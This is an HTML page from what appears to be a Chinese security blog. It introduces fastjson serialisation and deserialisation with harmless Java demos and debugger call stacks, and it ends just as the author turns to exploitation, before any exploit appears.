@@ -1,0 +1,1396 @@
+<!doctype html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="记录安全研究、开发实践与日常笔记。">
+    
+    <title>fastjson反序列化 - fupanc&#39;s blog</title>
+    
+    <link rel="icon" type="image/jpeg" href="/b_745d6ae6bb891da712bf1cb675340a9d.jpg">
+    
+    <link rel="stylesheet" href="/css/main.min.c9a3850ec4f2507c3c5c2460a8e1ef1354a20e5e14dbad80208ac8b8c4d52708.css">
+  </head>
+  <body>
+    <header class="topbar">
+      <a class="brand" href="/">fupanc&#39;s blog</a>
+      <div class="site-search" role="search" data-search-root>
+        <label class="visually-hidden" for="site-search-input">搜索文章</label>
+        <div class="site-search-field">
+          <svg class="site-search-icon" viewBox="0 0 24 24" aria-hidden="true">
+            <path d="m21 21-4.35-4.35m1.35-5.65a7 7 0 1 1-14 0 7 7 0 0 1 14 0z"/>
+          </svg>
+          <input
+            id="site-search-input"
+            type="search"
+            placeholder="搜索文章"
+            autocomplete="off"
+            aria-controls="site-search-results"
+            aria-expanded="false"
+            data-search-input
+          >
+        </div>
+        <div id="site-search-results" class="site-search-results" aria-live="polite" data-search-results hidden></div>
+      </div>
+      <nav class="main-nav" aria-label="主导航">
+        
+          <a href="/" >首页</a>
+        
+          <a href="/posts/" aria-current="page">文章</a>
+        
+      </nav>
+    </header>
+    
+  
+  
+  <main class="kb-layout">
+    
+      <aside class="sidebar sidebar-left" aria-label="文章目录">
+        <div class="sidebar-title">文章目录</div>
+        
+
+
+
+  <ul class="post-tree">
+    
+      
+      
+      
+      
+      
+      <li class="is-section is-open">
+        
+          
+          <div class="post-tree-row">
+            <button
+              class="tree-toggle"
+              type="button"
+              aria-expanded="true"
+              aria-controls="tree-85e8c9f77390c79070a2d29a0a102024"
+              aria-label="展开或收起 fastjson"
+            >
+              <span class="tree-icon tree-icon-caret" aria-hidden="true"></span>
+            </button>
+            <span class="tree-link tree-label">
+              <span class="tree-title">fastjson</span>
+            </span>
+          </div>
+          <div id="tree-85e8c9f77390c79070a2d29a0a102024" class="post-tree-children" >
+            
+
+
+
+  <ul class="post-tree">
+    
+      
+      
+      
+      
+      
+      <li class="is-page is-active">
+        
+          <a class="tree-link" href="/posts/fastjson/1/" aria-current="page">
+            <span class="tree-icon tree-icon-dot" aria-hidden="true"></span>
+            <span class="tree-title">fastjson反序列化</span>
+            
+          </a>
+        
+      </li>
+    
+      
+      
+      
+      
+      
+      <li class="is-page">
+        
+          <a class="tree-link" href="/posts/fastjson/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" >
+            <span class="tree-icon tree-icon-dot" aria-hidden="true"></span>
+            <span class="tree-title">Fastjson 反序列化补充</span>
+            
+          </a>
+        
+      </li>
+    
+  </ul>
+
+
+          </div>
+        
+      </li>
+    
+      
+      
+      
+      
+      
+      <li class="is-section">
+        
+          
+          <div class="post-tree-row">
+            <button
+              class="tree-toggle"
+              type="button"
+              aria-expanded="false"
+              aria-controls="tree-373cde237f2468bd1c680f892097eafb"
+              aria-label="展开或收起 guide"
+            >
+              <span class="tree-icon tree-icon-caret" aria-hidden="true"></span>
+            </button>
+            <span class="tree-link tree-label">
+              <span class="tree-title">guide</span>
+            </span>
+          </div>
+          <div id="tree-373cde237f2468bd1c680f892097eafb" class="post-tree-children" hidden>
+            
+
+
+
+  <ul class="post-tree">
+    
+      
+      
+      
+      
+      
+      <li class="is-page">
+        
+          <a class="tree-link" href="/posts/guide/getting-started/" >
+            <span class="tree-icon tree-icon-dot" aria-hidden="true"></span>
+            <span class="tree-title">快速开始</span>
+            
+          </a>
+        
+      </li>
+    
+  </ul>
+
+
+          </div>
+        
+      </li>
+    
+      
+      
+      
+      
+      
+      <li class="is-section">
+        
+          
+          <div class="post-tree-row">
+            <button
+              class="tree-toggle"
+              type="button"
+              aria-expanded="false"
+              aria-controls="tree-8bfeddd65de8e07396687d0c0fb97cfe"
+              aria-label="展开或收起 notes"
+            >
+              <span class="tree-icon tree-icon-caret" aria-hidden="true"></span>
+            </button>
+            <span class="tree-link tree-label">
+              <span class="tree-title">notes</span>
+            </span>
+          </div>
+          <div id="tree-8bfeddd65de8e07396687d0c0fb97cfe" class="post-tree-children" hidden>
+            
+
+
+
+  <ul class="post-tree">
+    
+      
+      
+      
+      
+      
+      <li class="is-page">
+        
+          <a class="tree-link" href="/posts/notes/hugo-github-pages/" >
+            <span class="tree-icon tree-icon-dot" aria-hidden="true"></span>
+            <span class="tree-title">Hugo 与 GitHub Pages</span>
+            
+          </a>
+        
+      </li>
+    
+  </ul>
+
+
+          </div>
+        
+      </li>
+    
+  </ul>
+
+
+      </aside>
+    
+    <article class="content-panel article article-main">
+      <nav class="breadcrumb" aria-label="面包屑">
+        
+        
+        
+          <a href="/posts/">文章</a>
+        
+          <span>/</span><a href="/posts/fastjson/">fastjson</a>
+        
+      </nav>
+      <h1 id="fastjson反序列化">fastjson反序列化</h1>
+<p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，可以序列化一个对象为json字符串们，也可以反序列化一个json字符串为一个对象，其实也就是和jackson差不多的。</p>
+<h2 id="基本过程了解">基本过程了解</h2>
+<p>在这里先来看json序列化和反序列化的过程。</p>
+<p>导入依赖</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>com.alibaba<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>fastjson<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>1.2.24<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><p>如下就是一个简单的序列化和反序列化的过程：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">person</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Person</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="p">.</span><span class="na">setAge</span><span class="p">(</span><span class="n">1233</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//序列化</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;=====序列化=====&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">toJSONString</span><span class="p">(</span><span class="n">person</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//反序列化</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;=====反序列化=====&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">person1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="n">Person</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">.</span><span class="na">getAge</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">Person</span><span class="w">  </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">object</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Person</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Getters and Setters</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getAge</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAge</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>输出为：</p>
+<pre tabindex="0"><code>=====序列化=====
+{&#34;age&#34;:1233,&#34;name&#34;:&#34;fupanc&#34;}
+=====反序列化=====
+fupanc
+1233
+</code></pre><p>这里的转换过程其实是和jackson差不多的，都是调用的getter和setter来进行的取值与赋值。</p>
+<ul>
+<li>@JSONField注解</li>
+</ul>
+<p>不知道有没有用，先简单了解一下，通过这个注解，我们可以自定义字段的名称的输出，如下demo：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.annotation.JSONField</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">person</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Person</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="p">.</span><span class="na">setAge</span><span class="p">(</span><span class="n">1233</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//序列化</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;=====序列化=====&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">toJSONString</span><span class="p">(</span><span class="n">person</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//反序列化</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;=====反序列化=====&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">person1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="n">Person</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">.</span><span class="na">getAge</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">Person</span><span class="w">  </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@JSONField</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;user_name&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@JSONField</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;user_age&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Person</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Getters and Setters</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getAge</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAge</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">){</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>此时的输出为：</p>
+<pre tabindex="0"><code>=====序列化=====
+{&#34;user_age&#34;:1233,&#34;user_name&#34;:&#34;fupanc&#34;}
+=====反序列化=====
+fupanc
+1233
+</code></pre><p>从结果可以看出来这里的具体示例，也就是当使用了<code>@JSONField</code>这个注解，序列化时会将这个注解标注的字段的字段名序列化为注解指定的字段名，而反序列化时就会自动识别到这个注解标注的字段从而成功反序列化赋值。</p>
+<h3 id="调试分析">调试分析</h3>
+<p>调试分析一下这里获取getter和setter的过程，这里就来简单说说我这里的调试过程</p>
+<h4 id="序列化过程">序列化过程</h4>
+<p>在JSON.toJSONString()处打一个断点开始调试，通过调试时的变量的值的替换，在这一步后发现调用变量存在了getter方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407202558373.png" alt="image-20250407202558373"></p>
+<p>此时的调用栈为：</p>
+<pre tabindex="0"><code>write:272, JSONSerializer (com.alibaba.fastjson.serializer)
+toJSONString:637, JSON (com.alibaba.fastjson)
+toJSONString:579, JSON (com.alibaba.fastjson)
+toJSONString:544, JSON (com.alibaba.fastjson)
+main:14, Fastjson_Test (fastjson)
+</code></pre><p>我们跟进这个getObjectWriter()方法，然后一直跟进，可以发现其实主要的获取到getter方法存在如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407202852389.png" alt="image-20250407202852389"></p>
+<p>跟进这个createJavaBeanSerializer()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407202953300.png" alt="image-20250407202953300"></p>
+<p>这里主要起作用的代码也在图中标注了，最重要的就是方法内部的第一行代码，跟进这里调用的buildBeanInfo()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407203548358.png" alt="image-20250407203548358"></p>
+<p>再跟进这里的parserAllFieldToCache()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407203747261.png" alt="image-20250407203747261"></p>
+<p>常见的获取字段名的操作，获取到后还将起放入到了这形参传入的HashMap类实例中，还可以看到是尝试获取了父类的字段值。</p>
+<p>回到buildBeanInfo()方法，另外一个非常重要的方法就是computeGetters()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407211304061.png" alt="image-20250407211304061"></p>
+<p>可以很容易看出来这里就是一个获取方法的操作，最后还是将其放入到键值对中：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407211510395.png" alt="image-20250407211510395"></p>
+<p>过程就不具体说了，可以自己跟一下。再回到buildBeanInfo()方法，然后对字段进行了一下排序，再返回了一个实例化的SerializeBeanInfo类：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407204347416.png" alt="image-20250407204347416"></p>
+<p>所以这里其实也就是一个获取到类中的信息的函数调用的操作，其实基本获取到了需要的所有消息。然后就会调用到createJavaBeanSerializer()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407204452428.png" alt="image-20250407204452428"></p>
+<p>后续具体也就不说了，都是一些进行处理的操作。</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250407211903187.png" alt="image-20250407211903187"></p>
+<p>最后这里赋值的getters就是后续要用到的，此时的调用栈如下：</p>
+<pre tabindex="0"><code>&lt;init&gt;:73, JavaBeanSerializer (com.alibaba.fastjson.serializer)
+createJavaBeanSerializer:152, SerializeConfig (com.alibaba.fastjson.serializer)
+createJavaBeanSerializer:126, SerializeConfig (com.alibaba.fastjson.serializer)
+getObjectWriter:580, SerializeConfig (com.alibaba.fastjson.serializer)
+getObjectWriter:355, SerializeConfig (com.alibaba.fastjson.serializer)
+getObjectWriter:329, JSONSerializer (com.alibaba.fastjson.serializer)
+write:272, JSONSerializer (com.alibaba.fastjson.serializer)
+toJSONString:637, JSON (com.alibaba.fastjson)
+toJSONString:579, JSON (com.alibaba.fastjson)
+toJSONString:544, JSON (com.alibaba.fastjson)
+main:14, Fastjson_Test (fastjson)
+</code></pre><p>其他过程就不多说了，重点就是获取到getter方法，对于后面的调用getter方法来获取值，代码如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091344459.png" alt="image-20250409134430420"></p>
+<p>调用invoke()方法来进行调用，调用栈如下：</p>
+<pre tabindex="0"><code>get:450, FieldInfo (com.alibaba.fastjson.util)
+getPropertyValueDirect:110, FieldSerializer (com.alibaba.fastjson.serializer)
+write:196, JavaBeanSerializer (com.alibaba.fastjson.serializer)
+write:275, JSONSerializer (com.alibaba.fastjson.serializer)
+toJSONString:637, JSON (com.alibaba.fastjson)
+toJSONString:579, JSON (com.alibaba.fastjson)
+toJSONString:544, JSON (com.alibaba.fastjson)
+main:13, Fastjson_Test (fastjson)
+</code></pre><p>自己调一下就知道了。</p>
+<h4 id="反序列化过程">反序列化过程</h4>
+<p>打断点于JSON.parseObject()方法，反序列化，主要还是对setter方法的获取和调用。调试发现获取到类是在如下方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250408160525097.png" alt="image-20250408160525097"></p>
+<p>那么想要获取到的过程就在这个方法中，此时调用栈：</p>
+<pre tabindex="0"><code>parseObject:339, JSON (com.alibaba.fastjson)
+parseObject:243, JSON (com.alibaba.fastjson)
+parseObject:456, JSON (com.alibaba.fastjson)
+main:18, Fastjson_Test (fastjson)
+</code></pre><p>继续跟进这个方法，一直走，看到一个非常熟悉的变量：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091250248.png" alt="image-20250409125020191"></p>
+<p>JavaBeanInfo，应该同样是一个获取到类相关属性的操作，跟进这里调用的build()方法，可以看到又是一个获取类的变量以及方法的处理：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091252406.png" alt="image-20250409125235358"></p>
+<p>后面就是对方法的处理，来获取到setter方法，还有处理getter方法的逻辑，这里也就不多说了，在这里的处理方法都是将获取到的类属性，放入到一个FieldInfo类中，然后放入到一个数组中，最后实例化一个JavaBean类：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091305732.png" alt="image-20250409130525687"></p>
+<p>继续跟进这个类的实例化，然后还是将其赋值给这个类的变量，和序列化那里大相径庭：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091307348.png" alt="image-20250409130738302"></p>
+<p>具体如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091348824.png" alt="image-20250409134858785"></p>
+<p>也就是获取到了一个变量的setter方法。那么哪里对这个setter进行了调用呢，这里赋值完了然后，一直回退，到如下方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091353465.png" alt="image-20250409135336422"></p>
+<p>这里是将生成的derializer放进一个键值对，然后一直回退，会调用<code>deserialze</code>方法进行处理，然后一直往后面走，这里会调用createInstance()方法来创建一个类实例：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091406691.png" alt="image-20250409140618644"></p>
+<p>主要是利用的无参构造方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250412131514863.png" alt="image-20250412131514863"></p>
+<p>createInstance()方法也就是返回的这个object，回到调用的deserialze方法，继续往后，会调用setValue()方法来进行赋值：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091406446.png" alt="image-20250409140650413"></p>
+<p>setValue()方法内部同样调用了invoke()方法进行赋值：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091408942.png" alt="image-20250409140806906"></p>
+<p>可以看到这里就是对前一个类实例调用的setAge()方法，从而可以成功赋值，并且最后是返回的这个赋值完了的类实例：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/202504091410352.png" alt="image-20250409141020301"></p>
+<p>最后就成功json反序列化得到了指定的类。</p>
+<p>从上面的整个过程来看，可以看出确实是调用的getter和setter来进行的序列化和反序列化的取值与赋值，现在来看看这里的具体利用。</p>
